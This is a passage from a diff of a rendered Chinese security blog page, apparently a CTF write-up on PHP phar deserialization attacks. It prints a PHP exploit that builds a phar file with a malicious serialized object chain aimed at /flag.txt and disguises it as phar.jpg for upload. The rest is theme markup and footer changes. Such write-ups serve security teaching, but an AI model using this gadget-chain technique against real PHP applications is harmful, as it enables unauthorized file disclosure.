 <p><code>$name</code>代表要调用的方法名称，<code>$arguments</code>代表要传递给此方法的参数。</p>
 <p>构造出来的EXP如下：</p>
-<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename = <span class="string">'/flag.txt'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">  	<span class="keyword">public</span> __construct()&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;files=<span class="keyword">array</span>(<span class="keyword">new</span> File());<span class="comment">//将File对象存储到数组files中</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$b=<span class="keyword">new</span> FileList();<span class="comment">//完成存储文件名</span></span><br><span class="line">$c=<span class="keyword">new</span> User();</span><br><span class="line">$c-&gt;db=$b;</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">"test.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar123.phar"</span>); </span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER();?&gt;"</span>); </span><br><span class="line">$phar-&gt;setMetadata($c); </span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); </span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">rename(<span class="string">'phar123.phar'</span>,<span class="string">'phar.jpg'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">{</span>
-    <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-<span class="token keyword">class</span> <span class="token class-name">File</span><span class="token punctuation">{</span>
-    <span class="token keyword">public</span> <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">'/flag.txt'</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-<span class="token keyword">class</span> <span class="token class-name">FileList</span><span class="token punctuation">{</span>
-    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>
-      <span class="token keyword">public</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-      <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将File对象存储到数组files中</span>
-    <span class="token punctuation">}</span>
-<span class="token punctuation">}</span>
-<span class="token variable">$b</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FileList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//完成存储文件名</span>
-<span class="token variable">$c</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">=</span><span class="token variable">$b</span><span class="token punctuation">;</span>
 
-@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"test.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"phar123.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
-<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"&lt;?php __HALT_COMPILER();?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
-<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
-<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
-<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token function">rename</span><span class="token punctuation">(</span><span class="token string">'phar123.phar'</span><span class="token punctuation">,</span><span class="token string">'phar.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>上传后删除即可得到flag.</p>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>发现自己的PHP水平还有待提高，不然看代码审计会有很大困难。</p>
-
-  </div>
-</article>
-
-
-        
-          <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-         
-          <li><a href="/">Home</a></li>
-         
-          <li><a href="/about/">About</a></li>
-         
-          <li><a href="/archives/">Writing</a></li>
-         
-          <li><a href="/search/">Search</a></li>
-         
-          <li><a href="https://github.com/evilAdan0s" target="_blank" rel="noopener">Projects</a></li>
-        
-      </ul>
-    </div>
-
-    <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#何为phar？"><span class="toc-number">1.</span> <span class="toc-text">何为phar？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#原理"><span class="toc-number">2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#攻击方法"><span class="toc-number">3.</span> <span class="toc-text">攻击方法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li></ol>
-    </div>
-
-    <div id="share-footer" style="display: none">
-      <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://eviladan0s.github.io/2020/03/14/php_phar/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=https://eviladan0s.github.io/2020/03/14/php_phar/&text=利用phar伪协议进行反序列化攻击" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://eviladan0s.github.io/2020/03/14/php_phar/&title=利用phar伪协议进行反序列化攻击" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://eviladan0s.github.io/2020/03/14/php_phar/&is_video=false&description=利用phar伪协议进行反序列化攻击" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=利用phar伪协议进行反序列化攻击&body=Check out this article: https://eviladan0s.github.io/2020/03/14/php_phar/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=https://eviladan0s.github.io/2020/03/14/php_phar/&title=利用phar伪协议进行反序列化攻击" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=https://eviladan0s.github.io/2020/03/14/php_phar/&title=利用phar伪协议进行反序列化攻击" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://eviladan0s.github.io/2020/03/14/php_phar/&title=利用phar伪协议进行反序列化攻击" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=https://eviladan0s.github.io/2020/03/14/php_phar/&title=利用phar伪协议进行反序列化攻击" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://eviladan0s.github.io/2020/03/14/php_phar/&name=利用phar伪协议进行反序列化攻击&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://eviladan0s.github.io/2020/03/14/php_phar/&t=利用phar伪协议进行反序列化攻击" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
-        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
-    </div>
-
-  </div>
-</div>
-
-        
-        <footer id="footer">
-  <div class="footer-left">
-    Copyright &copy; 2020 白袍
-  </div>
-  <div class="footer-right">
-    <nav>
-      <ul>
-         
-          <li><a href="/">Home</a></li>
-         
-          <li><a href="/about/">About</a></li>
-         
-          <li><a href="/archives/">Writing</a></li>
-         
-          <li><a href="/search/">Search</a></li>
-         
-          <li><a href="https://github.com/evilAdan0s" target="_blank" rel="noopener">Projects</a></li>
-        
-      </ul>
-    </nav>
-  </div>
-</footer>
-
-    </div>
-    <!-- styles -->
-
-<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
-
-
-<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
-
-
-    <!-- jquery -->
-
-<script src="/lib/jquery/jquery.min.js"></script>
-
-
-<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
-
-<!-- clipboard -->
-
-  
-<script src="/lib/clipboard/clipboard.min.js"></script>
-
-  <script type="text/javascript">
-  $(function() {
-    // copy-btn HTML
-    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
-    btn += '<i class="far fa-clone"></i>';
-    btn += '</span>'; 
-    // mount it!
-    $(".highlight table").before(btn);
-    var clip = new ClipboardJS('.btn-copy', {
-      text: function(trigger) {
-        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
-      }
-    });
-    clip.on('success', function(e) {
-      e.trigger.setAttribute('aria-label', "Copied!");
-      e.clearSelection();
-    })
-  })
-  </script>
-
-
-<script src="/js/main.js"></script>
-
-<!-- search -->
-
-  
-<script src="/js/search.js"></script>
-
-  <script type="text/javascript">
-  $(function() {
-
-    var $inputArea = $("input#search-input");
-    var $resultArea = document.querySelector("div#search-result");
-
-    $inputArea.focus(function() {
-      var search_path = "search.xml";
-      if (search_path.length == 0) {
-        search_path = "search.xml";
-      }
-      var path = "/" + search_path;
-      searchFunc(path, 'search-input', 'search-result');
-    });
-
-    $inputArea.keydown(function(e) {
-      if (e.which == 13) {
-        e.preventDefault();
-      }
-    });
-
-    var observer = new MutationObserver(function(mutationsList, observer) {
-      if (mutationsList.length == 1) {
-        if (mutationsList[0].addedNodes.length) {
-          $(".search-no-result").hide();
-        } else if (mutationsList[0].removedNodes.length) {
-          $(".search-no-result").show(200);
-        }
-      }
-    });
-
-    observer.observe($resultArea, { childList: true });
-
-  });
-  </script>
-
-<!-- Google Analytics -->
-
-<!-- Baidu Analytics -->
-
-<!-- Disqus Comments -->
-
-<!-- particles -->
-
-<script src="/lib/particles/particles.min.js"></script>
-
-<script type="text/javascript">
- 
-      
-</script>
-
-    <div id="particles-js"></div>
-</body>
-</html>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">白袍</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://eviladan0s.github.io/2020/03/14/php_phar/">https://eviladan0s.github.io/2020/03/14/php_phar/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">安全研究</a></div><div class="post-qr-code"><div class="post-qr-code-item"><img class="post-qr-code__img" src="/img/weixin.png"><div class="post-qr-code__desc">感谢支持</div></div></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2020/03/17/php-chanllenge/"><i class="fa fa-chevron-left">  </i><span>PHP反序列化大挑战</span></a></div><div class="next-post pull-right"><a href="/2020/03/12/cmd_arg/"><span>escapeshellarg()与escapeshellcmd()的奇妙组合</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(/img/back.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2020 By 白袍</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="footer_custom_text">hitokoto</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+  $('#top-container').addClass('is-mobile')
+}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>Powered by</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>
